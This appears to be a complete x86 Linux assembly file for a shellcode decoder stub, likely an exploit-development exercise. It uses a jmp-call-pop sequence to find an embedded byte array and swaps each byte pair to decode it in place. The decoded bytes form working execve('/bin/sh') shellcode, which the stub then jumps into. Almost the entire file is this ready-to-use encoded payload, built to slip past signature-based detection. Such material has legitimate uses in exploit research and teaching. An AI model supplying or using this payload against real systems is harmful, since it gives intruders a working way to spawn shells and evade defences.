section .text
    global _start

_start:
    jmp .data
.code:
    pop esi             ; Point esi to the beginning of the shellcode
    push shellcode_len  ; Put (shellcode length)/2 into ecx
    pop ecx
    xor eax, eax
.decrypt:
    lodsw            ; load two shellcode bytes into eax
    mov [esi-1], al  ; and switch them
    shr eax, 8
    mov [esi-2], al
    loop .decrypt    
    jmp shellcode

.data:
    call .code
    shellcode: db 0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69,0x31,0xe3,0x31,0xc9,0xb0,0xd2,0xcd,0x0b,0x90,0x80
    shellcode_len: equ ($-shellcode)/2
